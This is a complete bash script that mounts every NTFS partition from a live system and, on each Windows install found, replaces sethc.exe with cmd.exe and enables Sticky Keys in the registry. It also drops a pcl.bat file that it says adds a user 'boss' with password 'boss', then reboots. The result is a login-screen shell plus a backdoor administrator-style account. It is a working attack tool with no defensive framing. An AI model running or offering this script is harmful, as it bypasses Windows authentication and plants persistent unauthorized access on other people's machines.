#!/bin/bash
cd /root
chmod +r /root/*
val=`fdisk -l | grep NTFS | tr " " "\n" | grep /dev`
ntfsCounter=0
fixedPartions=0
fixedRegistry=0
stickyCommands=0
mkdir /mnt/windows
while read -r line; do
    ((ntfsCounter++))
    mount -t ntfs-3g $line /mnt/windows
    cd /mnt/windows
    if [ -d "/mnt/windows/Windows/System32" ]; then
        ((fixedPartitions++))
        cd /mnt/windows/Windows/System32
        noNeedForReplacement=0
        cmp -s sethc.exe cmd.exe || noNeedForReplacement=1
        if [ $noNeedForReplacement -eq 0 ]; then
            cp sethc.exe sethc.bak
            rm -f sethc.exe
            cp cmd.exe sethc.exe
            ((stickyCommands++))
        fi
        cd /mnt/windows/Windows/System32/config
        reged -x DEFAULT HKEY_DEFAULT "Control Panel\Accessibility\StickyKeys" /root/windows.reg
        flagsValue=`cat /root/windows.reg | grep Flags | cut -c 10- | tr '"' ' ' | xargs`
        containsFour=`echo $((($flagsValue & 4) != 0))`
        if [ "$containsFour" -eq "0" ]; then
            ((fixedRegistry++))
            outVal=$((flagsValue + 4))
            echo $outVal
            sed "s/$flagsValue/$outVal/g" /root/windows.reg > /root/winout.reg
            echo y > /root/confirm.txt
            reged -I DEFAULT HKEY_DEFAULT /root/winout.reg < /root/confirm.txt
        fi
        cp /root/pcl.bat /mnt/windows/Windows/System32/pcl.bat
    fi
    cd /
    umount $line
done <<< "$val"
clear
echo "--------------------------------------------------------------------------------"
echo "--------------------------------------------------------------------------------"
echo "--------------------------------------------------------------------------------"
echo "--------------------------------Script Finished!--------------------------------"
echo "--------------------------------------------------------------------------------"
echo "--------------------------------------------------------------------------------"
echo "--------------------------------------------------------------------------------"
echo "--------Found $ntfsCounter NTFS partions"
echo "--------$fixedPartitions partitions with Windows"
echo "--------Enabled Sticky Keys in $fixedRegistry registers"
echo "--------Replaced $stickyCommands sethc.exe with cmd.exe"
echo "--------When logging in press SHIFT five times to open cmd.exe"
echo "--------pcl.bat adds user L:boss P:boss"
echo "--------------------------------------------------------------------------------"
echo "--------------------------------------------------------------------------------"
echo "--------------------------------------------------------------------------------"
for i in {10..1}
do
	echo -en "\rRebooting in $i seconds"
    sleep 1
done
reboot
